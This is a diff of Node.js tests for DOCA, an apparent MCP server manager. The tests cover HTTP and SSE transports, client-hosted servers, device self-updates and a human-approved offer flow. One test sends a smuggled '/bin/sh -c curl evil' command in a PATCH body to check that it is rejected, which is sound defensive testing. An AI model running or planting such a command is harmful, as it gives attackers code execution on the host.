@@ -9,6 +9,7 @@
  * started the same way any other would be. Nothing here reaches the network.
  */
 const { test, before, after } = require('node:test');
+const httpServer = require('./fixtures/mcp-http-server');
 const assert = require('node:assert/strict');
 const path = require('path');
 const fs = require('fs');
@@ -113,6 +114,209 @@ test('origin is DOCA\'s own bookkeeping and stays out of exported configs', () =
   assert.deepEqual(
     exporter.entry({ ...spec, origin: { kind: 'client', deviceId: 'dev_1' }, originLabel: 'Al\'s PC' }),
     { url: 'https://desk.example/mcp' });
+});
+
+test('a client-hosted server really is reached over http, and its tools reach the model', async () => {
+  // The first exercise of the HTTP transport against a server that answers a
+  // POST with one JSON-RPC reply — which is all `client.js` ever asks for, since
+  // it holds no event stream open. Until now only stdio was covered.
+  const httpStub = await httpServer.start({ requirePath: '/mcp/a-secret-path' });
+  after(() => httpStub.close());
+
+  const { device } = H.mkDevice('Desk Box', 'phone', { ...H.PHONE_CAPS, formFactor: 'desktop' });
+  const saved = await post('/api/mcp', {
+    label: 'Desk Reach', transport: 'http', url: httpStub.url,
+    origin: { kind: 'client', deviceId: device.id },
+  });
+  assert.equal(saved.status, 200);
+
+  const started = await post('/api/mcp/desk-reach/action', { action: 'start' });
+  assert.equal(started.body.ok, true, started.body.error || '');
+  assert.equal(started.body.server.state, 'running');
+  assert.equal(started.body.server.serverInfo.name, 'http-stub');
+  assert.equal(started.body.server.pid, null, 'nothing was spawned here — it is somebody else\'s process');
+  assert.deepEqual(started.body.server.tools.map(t => t.name).sort(), ['list_windows', 'type_text']);
+
+  // The session id the server handed out comes back on the next call, which is
+  // the one piece of Streamable HTTP state the client keeps.
+  assert.equal(httpStub.seen[0].method, 'initialize');
+  assert.equal(httpStub.seen[1].headers['mcp-session-id'], 'sess-http-stub');
+
+  // And a call actually lands on it, through the harness dispatcher.
+  assert.equal(await harnessTools.call('mcp__desk-reach__list_windows', {}), 'Notepad\nBlender');
+  assert.equal(mcpTools.available().find(t => t.exposed === 'mcp__desk-reach__list_windows').origin, 'client');
+
+  // Now the part that makes "do it on my PC" work. The environment block says
+  // where each server runs, but that is one line far from the decision: when the
+  // model chooses a function it is reading *these* descriptions.
+  const onClient = harnessTools.schemas().find(s => s.function.name === 'mcp__desk-reach__list_windows');
+  assert.match(onClient.function.description, /Runs on "Desk Box"/);
+  assert.match(onClient.function.description, /not on the DOCA host/);
+  assert.match(onClient.function.description, /List the windows/, 'the server\'s own description survives');
+
+  // Built-in tools are always on the host, so one client server is already an
+  // ambiguity — the host-side MCP tools get told apart too.
+  await post('/api/mcp/stub-server/action', { action: 'start' });
+  const onHost = harnessTools.schemas().find(s => s.function.name === 'mcp__stub-server__echo');
+  assert.match(onHost.function.description, /Runs on the DOCA host itself/);
+
+  // With the client gone it is noise again, and goes away.
+  registry.stop('desk-reach');
+  const alone = harnessTools.schemas().find(s => s.function.name === 'mcp__stub-server__echo');
+  assert.equal(/Runs on/.test(alone.function.description), false,
+    'with everything on the host there is nothing to disambiguate');
+  await post('/api/mcp/stub-server/action', { action: 'stop' });
+
+  assert.equal((await H.api(null, 'DELETE', '/api/mcp/desk-reach')).status, 200);
+});
+
+test('a client-hosted server can also answer in SSE framing, since both are real', async () => {
+  const httpStub = await httpServer.start({ sse: true });
+  after(() => httpStub.close());
+
+  const { device } = H.mkDevice('SSE Desk', 'phone', H.PHONE_CAPS);
+  await post('/api/mcp', {
+    label: 'Sse Reach', transport: 'http', url: httpStub.url,
+    origin: { kind: 'client', deviceId: device.id },
+  });
+  const started = await post('/api/mcp/sse-reach/action', { action: 'start' });
+  assert.equal(started.body.ok, true, started.body.error || '');
+  assert.equal(started.body.server.toolCount, 2);
+
+  registry.stop('sse-reach');
+  assert.equal((await H.api(null, 'DELETE', '/api/mcp/sse-reach')).status, 200);
+});
+
+test('a device can correct the address of the server it hosts, and nothing else', async () => {
+  const { device, token } = H.mkDevice('Al\'s Desk', 'phone', { ...H.PHONE_CAPS, formFactor: 'desktop' });
+  const dev = (m, p, b) => H.api(token, m, p, b);
+
+  // Nothing points at it yet, and it cannot create that itself — only a human
+  // in the dashboard can, which is the whole point.
+  assert.equal((await dev('GET', '/api/v1/mcp/self')).status, 404);
+
+  await post('/api/mcp', {
+    label: 'Desk Own', transport: 'http', url: 'https://old.example/mcp',
+    origin: { kind: 'client', deviceId: device.id },
+  });
+
+  const seen = await dev('GET', '/api/v1/mcp/self');
+  assert.equal(seen.status, 200);
+  assert.equal(seen.body.server.url, 'https://old.example/mcp');
+  assert.equal(seen.body.server.id, 'desk-own');
+
+  // The case this exists for: a restart regenerated the secret in the URL.
+  const moved = await dev('PATCH', '/api/v1/mcp/self', { url: 'https://new.example/mcp/abc123' });
+  assert.equal(moved.status, 200);
+  assert.equal(moved.body.server.url, 'https://new.example/mcp/abc123');
+  assert.equal(registry.get('desk-own').url, 'https://new.example/mcp/abc123');
+
+  // A command would be a way to run code on this host, so it is not writable
+  // here however it is spelled — and neither is who owns the row.
+  await dev('PATCH', '/api/v1/mcp/self', {
+    command: '/bin/sh', args: ['-c', 'curl evil'], transport: 'stdio',
+    origin: { kind: 'client', deviceId: 'dev_someone_else' }, autostart: true,
+  });
+  const after = registry.get('desk-own');
+  assert.equal(after.command, '', 'no command arrived');
+  assert.equal(after.transport, 'http', 'still reached over http');
+  assert.equal(after.autostart, false, 'cannot make itself start with DOCA');
+  assert.deepEqual(after.origin, { kind: 'client', deviceId: device.id }, 'cannot repoint the row at another device');
+
+  assert.equal((await dev('PATCH', '/api/v1/mcp/self', { url: 'ftp://nope' })).status, 400);
+
+  // Another device's row is simply not visible: this is not "self or admin", it
+  // is self only.
+  const { token: other } = H.mkDevice('Someone Else', 'phone', H.PHONE_CAPS);
+  assert.equal((await H.api(other, 'GET', '/api/v1/mcp/self')).status, 404);
+
+  // And without the scope, not at all.
+  const { token: watch } = H.mkDevice('A Watch', 'watch', H.WATCH_CAPS);
+  assert.equal((await H.api(watch, 'GET', '/api/v1/mcp/self')).status, 403);
+
+  assert.equal((await H.api(null, 'DELETE', '/api/mcp/desk-own')).status, 200);
+});
+
+test('a client offers its server, and only a click lets it in', async () => {
+  const { device, token } = H.mkDevice('Offering Desk', 'phone', { ...H.PHONE_CAPS, formFactor: 'desktop' });
+
+  const offered = await H.api(token, 'POST', '/api/v1/mcp/offer', {
+    label: 'Offered Tools', url: 'https://offer.example/mcp/secret',
+    tools: ['list_windows', 'screenshot'], note: 'Windows desktop tools',
+  });
+  // 202: recorded, not accepted. The distinction is the feature.
+  assert.equal(offered.status, 202);
+  assert.equal(offered.body.offer.status, 'pending');
+
+  // Nothing has been created. A request from the network cannot add a server.
+  assert.equal((await get('/api/mcp')).body.servers.some(s => s.id === 'offered-tools'), false);
+  assert.equal((await H.api(token, 'GET', '/api/v1/mcp/self')).status, 404);
+
+  // The panel sees it waiting.
+  const pending = (await get('/api/mcp')).body.offers;
+  assert.equal(pending.length, 1);
+  assert.equal(pending[0].deviceName, 'Offering Desk');
+
+  // Offering again replaces rather than queues: a client correcting a URL it
+  // just regenerated should not leave a stale card behind.
+  await H.api(token, 'POST', '/api/v1/mcp/offer', { label: 'Offered Tools', url: 'https://offer.example/mcp/second' });
+  const still = (await get('/api/mcp')).body.offers;
+  assert.equal(still.length, 1);
+  assert.equal(still[0].url, 'https://offer.example/mcp/second');
+
+  const accepted = await post(`/api/mcp/offers/${still[0].id}/accept`, {});
+  assert.equal(accepted.status, 200);
+  assert.equal(accepted.body.server.transport, 'http', 'an offer can only ever become an http server');
+  assert.deepEqual(accepted.body.server.origin, { kind: 'client', deviceId: device.id });
+  assert.equal((await get('/api/mcp')).body.offers.length, 0, 'and leaves the queue');
+
+  // Deciding twice is a conflict, not a second write.
+  assert.equal((await post(`/api/mcp/offers/${still[0].id}/accept`, {})).status, 409);
+
+  // Now that a row exists, the device can maintain its own address.
+  assert.equal((await H.api(token, 'GET', '/api/v1/mcp/self')).status, 200);
+
+  // A revoked device does not get a server pointed at it because it asked
+  // nicely before it was revoked.
+  const { device: gone, token: goneToken } = H.mkDevice('Doomed Desk', 'phone', H.PHONE_CAPS);
+  await H.api(goneToken, 'POST', '/api/v1/mcp/offer', { label: 'Doomed', url: 'https://doomed.example/mcp' });
+  const doomed = (await get('/api/mcp')).body.offers.find(o => o.deviceId === gone.id);
+  require('../modules/api-v1/devices').revoke(gone.id);
+  const refused = await post(`/api/mcp/offers/${doomed.id}/accept`, {});
+  assert.equal(refused.status, 409);
+  assert.match(refused.body.error, /no longer paired/);
+
+  await post(`/api/mcp/offers/${doomed.id}/reject`, { reason: 'not that one' });
+  assert.equal((await H.api(null, 'DELETE', '/api/mcp/offered-tools')).status, 200);
+});
+
+test('asking a client to run its server is a push, and says so honestly', async () => {
+  const { device } = H.mkDevice('Asked Desk', 'phone', { ...H.PHONE_CAPS, formFactor: 'desktop' });
+  await post('/api/mcp', {
+    label: 'Asked Server', transport: 'http', url: 'https://asked.example/mcp',
+    origin: { kind: 'client', deviceId: device.id },
+  });
+
+  const asked = await post('/api/mcp/asked-server/action', { action: 'listener-start' });
+  assert.equal(asked.status, 200);
+  assert.equal(asked.body.asked, true);
+  // Not connected, so the honest answer is "queued", never "started".
+  assert.equal(asked.body.online, false);
+  assert.match(asked.body.message, /not connected/);
+
+  const bus = require('../modules/api-v1/bus');
+  const ev = bus.drain(device.id, 0).events.find(e => e.type === 'mcp.listener');
+  assert.ok(ev, 'the device is the one that has to act, so it is the one told');
+  assert.equal(ev.payload.action, 'start');
+  assert.equal(ev.payload.serverId, 'asked-server');
+  assert.equal(ev.payload.url, 'https://asked.example/mcp', 'so a client can spot a URL we have wrong');
+
+  // A host-side server has nothing to ask: DOCA starts it itself.
+  const local = await post('/api/mcp/stub-server/action', { action: 'listener-start' });
+  assert.equal(local.status, 400);
+  assert.match(local.body.error, /runs on this host/);
+
+  assert.equal((await H.api(null, 'DELETE', '/api/mcp/asked-server')).status, 200);
 });
 
 test('starting a server completes the handshake and lists its tools', async () => {
